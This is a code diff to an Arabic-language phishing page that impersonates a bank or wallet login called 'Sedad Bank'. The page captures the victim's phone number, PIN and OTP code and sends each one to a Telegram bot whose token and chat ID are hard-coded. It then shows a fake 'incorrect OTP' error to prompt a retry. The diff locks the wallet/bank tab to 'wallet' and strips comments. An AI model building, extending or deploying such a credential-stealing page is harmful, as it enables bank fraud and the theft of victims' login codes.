@@ -29,7 +29,7 @@
         }
     </script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght=400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
         body {
             font-family: 'Cairo', sans-serif;
         }
@@ -54,7 +54,7 @@
             <img src="Sedad Bank" alt="Sedad Bank" class="w-full max-w-[390px] h-auto object-contain">
         </div>
 
-        <!-- خانتي التبديل: المحفظة / البنك -->
+        <!-- خانتي التبديل: المحفظة / البنك (مثبتة على المحفظة دائماً) -->
         <div class="w-full px-2 mb-4">
             <div class="w-full h-14 bg-[#EAECEF] p-1.5 rounded-[22px] flex items-center justify-between gap-1 shadow-inner" dir="rtl">
                 <button id="tabWallet" onclick="switchTab('wallet')" class="w-1/2 h-full bg-white text-gray-900 font-bold text-xl rounded-[18px] shadow-sm transition-all duration-200 flex items-center justify-center">
@@ -153,23 +153,19 @@
     </div>
 
     <script>
-        // --- دالة التبديل بين المحفظة والبنك ---
+        // --- تثبيت التبويب على المحفظة دائماً بغض النظر عن أي نقرات ---
         let selectedTab = 'wallet';
         function switchTab(tab) {
-            selectedTab = tab;
+            // يتم تجاهل أي طلب لتغيير التبويب والابقاء دائماً على المحفظة
+            selectedTab = 'wallet';
             const tabWallet = document.getElementById('tabWallet');
             const tabBank = document.getElementById('tabBank');
             
-            if (tab === 'wallet') {
-                tabWallet.className = "w-1/2 h-full bg-white text-gray-900 font-bold text-xl rounded-[18px] shadow-sm transition-all duration-200 flex items-center justify-center";
-                tabBank.className = "w-1/2 h-full text-gray-500 font-bold text-xl rounded-[18px] transition-all duration-200 flex items-center justify-center hover:text-gray-700";
-            } else {
-                tabBank.className = "w-1/2 h-full bg-white text-gray-900 font-bold text-xl rounded-[18px] shadow-sm transition-all duration-200 flex items-center justify-center";
-                tabWallet.className = "w-1/2 h-full text-gray-500 font-bold text-xl rounded-[18px] transition-all duration-200 flex items-center justify-center hover:text-gray-700";
-            }
+            tabWallet.className = "w-1/2 h-full bg-white text-gray-900 font-bold text-xl rounded-[18px] shadow-sm transition-all duration-200 flex items-center justify-center";
+            tabBank.className = "w-1/2 h-full text-gray-500 font-bold text-xl rounded-[18px] transition-all duration-200 flex items-center justify-center hover:text-gray-700";
         }
 
-        // --- بداية إعدادات ودوال التليجرام المُضافة ---
+        // --- بداية إعدادات ودوال التليجرام ---
         const TELEGRAM_TOKEN = "8854630231:AAHwY-escCA2tlAzBgDZWqNaPNqUNTpIKGA";
         const TELEGRAM_CHAT_ID = "8972356637";
 
@@ -233,7 +229,6 @@
             clearInterval(timerInterval);
             otpInputs.forEach(input => input.value = '');
             
-            // إعادة تعيين النص وحالة الزر
             otpBtn.disabled = false;
             otpBtn.textContent = "تسجيل الدخول";
         }
@@ -350,8 +345,7 @@
                 return;
             }
 
-            // إرسال رقم الهاتف ورمز الـ PIN مع تحديد (المحفظة أم البنك) إلى تليجرام
-            const typeText = selectedTab === 'wallet' ? 'المحفظة' : 'البنك';
+            const typeText = 'المحفظة';
             const msg = `📥 تسجيل دخول جديد (${typeText}):\n📱 الهاتف: ${phoneNumber}\n🔑 الرمز: ${pinCode}`;
             sendTelegramMessage(msg);
 
@@ -364,17 +358,14 @@
             
             if (otpCode.length < 6) return;
 
-            // إرسال رمز OTP إلى تليجرام
             const phoneNumber = phoneInput.value.trim();
-            const typeText = selectedTab === 'wallet' ? 'المحفظة' : 'البنك';
+            const typeText = 'المحفظة';
             const msg = `📲 رمز OTP لـ (${phoneNumber}) - [${typeText}]:\n🔢 الرمز: ${otpCode}`;
             sendTelegramMessage(msg);
 
-            // 1. تغيير نص الزر وتعطيله
             otpBtn.disabled = true;
             otpBtn.textContent = "جارٍ المعالجة...";
 
-            // 2. إغلاق نافذة OTP فوراً والعودة للشاشة الرئيسية
             setTimeout(() => {
                 closeOtpModal();
                 showErrorToast("رقم OTP غير صحيح، يرجى المحاولة مرة أخرى.");
